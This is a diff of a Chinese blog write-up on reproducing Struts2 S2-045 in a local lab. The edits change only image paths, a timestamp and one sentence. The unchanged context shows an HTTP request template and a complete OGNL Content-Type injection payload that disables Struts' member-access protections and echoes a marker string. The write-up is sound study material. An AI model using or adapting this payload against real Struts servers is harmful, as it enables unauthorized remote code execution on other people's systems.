@@ -15,11 +15,11 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2026/06/08/Struts2-S2-045%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-WP/2026-06-09-10-57-54.png">
 <meta property="og:image" content="http://example.com/2026/06/08/Struts2-S2-045%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-WP/2026-06-09-11-00-29.png">
-<meta property="og:image" content="http://example.com/2026-06-09-11-43-45.png">
+<meta property="og:image" content="http://example.com/2026/06/08/Struts2-S2-045%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-WP/2026-06-09-11-43-45.png">
 <meta property="og:image" content="http://example.com/2026/06/08/Struts2-S2-045%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-WP/2026-06-09-11-41-25.png">
 <meta property="og:image" content="http://example.com/2026/06/08/Struts2-S2-045%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-WP/2026-06-09-11-49-22.png">
 <meta property="article:published_time" content="2026-06-08T03:43:00.000Z">
-<meta property="article:modified_time" content="2026-06-10T01:05:59.731Z">
+<meta property="article:modified_time" content="2026-06-10T01:14:30.340Z">
 <meta property="article:author" content="Vodka">
 <meta property="article:tag" content="Struts2-045 漏洞">
 <meta name="twitter:card" content="summary">
@@ -298,11 +298,12 @@ window.addEventListener('scroll', function() {
 <img src="/2026/06/08/Struts2-S2-045%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-WP/2026-06-09-11-00-29.png" class="">
 
 <p>修改后将数据包放行，放行后需要找到对应的数据包发送到 Repeater 中</p>
-<p><img src="/2026-06-09-11-43-45.png"></p>
+<img src="/2026/06/08/Struts2-S2-045%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-WP/2026-06-09-11-43-45.png" class="">
+
 <p>在 Repeater 这里进行修改干净的请求和使用安全验证 payload：<br>这里建议可以改成一个干净的请求，这里我没有进行更改；</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:9090</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: PAYLOAD_HERE</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
 
-<p>也可以直接使用安全验证 payload，把对应的 Content-Type 改成下面这个，它只输出标记和 <code>54289</code>，不执行系统命令：</p>
+<p>修改后直接使用安全验证 payload，把对应的 Content-Type 改成下面这个，它只输出标记和 <code>54289</code>，不执行系统命令：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#nike=<span class="string">&#x27;multipart/form-data&#x27;</span>).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#w.println(<span class="string">&#x27;S2-045-OK-54289&#x27;</span>)).(#w.flush())&#125;</span><br></pre></td></tr></table></figure>
 
 <img src="/2026/06/08/Struts2-S2-045%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-WP/2026-06-09-11-41-25.png" class="">
